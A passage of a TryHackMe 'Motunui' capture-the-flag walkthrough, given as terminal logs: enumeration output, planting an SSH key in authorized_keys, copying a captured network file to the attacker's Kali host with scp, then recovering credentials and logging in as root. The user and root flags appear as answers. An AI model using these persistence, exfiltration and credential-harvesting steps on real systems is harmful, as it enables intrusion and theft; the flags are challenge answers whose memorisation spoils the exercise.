 php7_module (shared)
 reqtimeout_module (shared)
 setenvif_module (shared)
 status_module (shared)
---
[!] sof040 Found any .htpasswd files?...................................... nope
[!] sof050 Are there private keys in ssh-agent?............................ nope
[!] sof060 Are there gpg keys cached in gpg-agent?......................... nope
[!] sof070 Can we write to a ssh-agent socket?............................. nope
[!] sof080 Can we write to a gpg-agent socket?............................. nope
[i] sof500 Sudo version.................................................... skip
[i] sof510 MySQL version................................................... skip
[i] sof520 Postgres version................................................ skip
[i] sof530 Apache version.................................................. skip
=============================================================( containers )=====
[*] ctn000 Are we in a docker container?................................... nope
[*] ctn010 Is docker available?............................................ nope
[!] ctn020 Is the user a member of the 'docker' group?..................... nope
[*] ctn200 Are we in a lxc container?...................................... nope
[!] ctn210 Is the user a member of any lxc/lxd group?...................... nope
==============================================================( processes )=====
[i] pro000 Waiting for the process monitor to finish....................... yes!
[i] pro001 Retrieving process binaries..................................... yes!
[i] pro002 Retrieving process users........................................ yes!
[!] pro010 Can we write in any process binary?............................. nope
[*] pro020 Processes running with root permissions......................... yes!
---
START      PID     USER COMMAND
09:39    11913     root /usr/sbin/CRON -f
09:38     9847     root /lib/systemd/systemd-udevd
09:38     9846     root /lib/systemd/systemd-udevd
09:38     9845     root /lib/systemd/systemd-udevd
09:38     9844     root /lib/systemd/systemd-udevd
09:38     9843     root /lib/systemd/systemd-udevd
09:38     9842     root /lib/systemd/systemd-udevd
09:38     9841     root /lib/systemd/systemd-udevd
09:38     9840     root /sbin/modprobe -q -- fs-binfmt_misc
09:38     9839     root /lib/systemd/systemd-udevd
09:38     9838     root /bin/mount binfmt_misc /proc/sys/fs/binfmt_misc -t binfmt_misc
09:38     3710     root sudo -nS id
09:38    11648     root /lib/systemd/systemd-udevd
09:38    11646     root /bin/sh -e /usr/lib/php/sessionclean
09:38    11645     root sort -u -t: -k 1,1
09:38    11644     root sort -rn -t: -k2,2
09:38    11643     root /bin/sh -e /usr/lib/php/sessionclean
09:38    11642     root /lib/systemd/systemd-udevd
09:38    11641     root /lib/systemd/systemd-udevd
09:38    11640     root /lib/systemd/systemd-udevd
09:38    11639     root /lib/systemd/systemd-udevd
09:38    11638     root /lib/systemd/systemd-udevd
09:38    11637     root /lib/systemd/systemd-udevd
09:38    11636     root /lib/systemd/systemd-udevd
09:38    11635     root /lib/systemd/systemd-udevd
09:38    11634     root /lib/systemd/systemd-udevd
09:38    11633     root /bin/sh -e /usr/lib/php/sessionclean
09:33     2529     root /usr/sbin/CRON -f
07:45      965     root /usr/sbin/cron -f
07:45      955     root /usr/sbin/nmbd --foreground --no-process-group
07:45     1265     root /usr/sbin/smbd --foreground --no-process-group
07:45     1252     root /usr/sbin/smbd --foreground --no-process-group
07:45     1251     root /usr/sbin/smbd --foreground --no-process-group
07:45     1217     root /usr/sbin/smbd --foreground --no-process-group
07:45     1160     root /usr/sbin/apache2 -k start
07:45     1095     root /usr/sbin/sshd -D
07:45     1078     root /usr/lib/policykit-1/polkitd --no-debug
07:45     1077     root /sbin/agetty -o -p -- \u --noclear tty1 linux
07:45     1076     root /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
07:45     1062     root /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
07:45     1047     root /lib/systemd/systemd-logind
07:45     1044     root /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
07:45     1042     root /usr/lib/accountsservice/accounts-daemon
07:45     1037     root /usr/bin/lxcfs /var/lib/lxcfs/
07:45     1033     root /usr/lib/snapd/snapd
07:45     1019     root /usr/bin/node /var/www/tls-html/server.js
07:44      454     root /lib/systemd/systemd-udevd
07:44      439     root /sbin/lvmetad -f
07:44      410     root /lib/systemd/systemd-journald
07:44        1     root /sbin/init auto automatic-ubiquity noprompt
---
[*] pro030 Processes running by non-root users with shell.................. nope
[i] pro500 Running processes............................................... skip
[i] pro510 Running process binaries and permissions........................ skip

==================================( FINISHED )==================================
www-data@motunui:~$
```

```
/home/network/traces/maui/ticket_6746.pcapng
```

```
www-data@motunui:~$ cd /home
cd /home
www-data@motunui:/home$ ls
ls
moana
network
www-data@motunui:/home$ find / -name "*.pkt" 2>/dev/null
find / -name "*.pkt" 2>/dev/null
/etc/network.pkt
```

```
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDO7GTxIFv/SEVqelwR1OrCvcDRsaOYuyU3JtdaFxv1IPMxp8soS007K9eeQyZvpSiU7ynIhwJsSrfhPH9PWvpPF937Ppe8+LX5e5b+5FsFMoVw6dkwWW2fNImlDcXf273vD/7bTRB+SBo+UcBuIR31ERpM+90xCNKv+HERbiq1TznnBZXJ16Pxu2VBfSCLF4ZjPO4BFG62IQQmkK1e3v3CeiF2b8t+lbS2LrUCbLKdPYvhH6rzoz1LoPwvNOryTivgjDhs/xGFBY3RThAKBiLJXTOAx4qLf4FMEo0Cr8y6GBz3mtLj/UJzNctwllvj4NwVgDpoTqt1EsMA+d1BQYlO5XF4CmhGbKyQamvgrXzdAUKgE1sZ1oel84A3POCrOGJdngPRM9EkUWI9H6619SVmohjukRfWRbMQaUz1mxCz8SUDJlGZWs9kJgKec/LqgjyJxH6VV3ArOKMdoaRQ3BNwHMVmONWFZVOvj+QzXtSWd+ubAdO4HdNwv/ehUj86Qzs= kali@kali" > ~/.ssh/authorized_keys

www-data@motunui:~$ scp /etc/network.pkt kali@10.8.106.222:/home/kali/CTFs/tryhackme/Motunui
ckme/Motunuiwork.pkt kali@10.8.106.222:/home/kali/CTFs/tryhac
The authenticity of host '10.8.106.222 (10.8.106.222)' can't be established.
ECDSA key fingerprint is SHA256:xCE0Cpa4vJaXG1mwn7ciMO55E0R11HvAmXVl2ymdG+Y.
Are you sure you want to continue connecting (yes/no)? yes
yes
Warning: Permanently added '10.8.106.222' (ECDSA) to the list of known hosts.
kali@10.8.106.222's password: kali

network.pkt                                   100%   74KB 585.4KB/s   00:00
www-data@motunui:~$
```

![](./2020-10-21_16-34.png)

`username moana privilege 1 password 0 H0wF4ri'LLG0`

```
moana@motunui:~$ ls
read_me  user.txt
moana@motunui:~$ cat user.txt
THM{m0an4_0f_M0tunu1}
moana@motunui:~$
```

```
moana@motunui:~$ env
NVM_DIR=/home/moana/.nvm
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
SSH_CONNECTION=10.8.106.222 59170 10.10.111.45 22
LESSCLOSE=/usr/bin/lesspipe %s %s
LANG=en_US.UTF-8
XDG_SESSION_ID=115
USER=moana
PWD=/home/moana
HOME=/home/moana
SSH_CLIENT=10.8.106.222 59170 22
XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
SSH_TTY=/dev/pts/1
MAIL=/var/mail/moana
TERM=xterm-256color
SHELL=/bin/bash
SHLVL=1
SSLKEYLOGFILE=/etc/ssl.txt
LOGNAME=moana
XDG_RUNTIME_DIR=/run/user/1000
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
LESSOPEN=| /usr/bin/lesspipe %s
_=/usr/bin/env
```

`username=root&password=Pl3aseW0rk`

```
kali@kali:~/CTFs/tryhackme/Motunui$ ssh root@10.10.111.45
root@10.10.111.45's password:
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Oct 21 14:46:18 UTC 2020

  System load:  0.0                Processes:           127
  Usage of /:   36.9% of 18.57GB   Users logged in:     1
  Memory usage: 24%                IP address for eth0: 10.10.111.45
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

20 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Aug 21 00:15:46 2020 from 192.168.236.128
root@motunui:~# ls
root.txt
root@motunui:~# cat root.txt
THM{h34rT_r35T0r3d}
```

1. What is the user flag?

`THM{m0an4_0f_M0tunu1}`

2. What is the root flag?

`THM{h34rT_r35T0r3d}`
